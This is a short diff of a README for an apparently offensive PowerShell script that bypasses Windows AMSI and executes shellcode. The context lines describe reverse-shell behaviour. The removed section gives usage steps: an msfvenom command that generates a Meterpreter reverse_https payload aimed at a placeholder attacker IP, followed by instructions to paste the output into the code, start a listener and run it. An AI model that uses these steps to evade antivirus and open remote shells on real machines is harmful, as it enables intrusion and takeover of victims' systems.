@@ -6,12 +6,6 @@ This script bypasses Windows AMSI and executes shellcode using PowerShell. Even 
     - After the shell code finishes, it should cause the thread to terminate
         - Ex. Reverse Shell -> after the attacker terminates the session, the thread should also be terminated, and with it, PowerShell as well
 
-## Usage(Msfvenom)
-First, generate a payload, let's say a msfvenom x64 reverse https using this command  
-*msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ip LPORT=443 -f csharp*
-Take the output starting at the bytes and copy it into the code. Run a listener with the *ip* and run the code using PowerShell.
-
-
 ## Explanation
 # 1.
 ```powershell
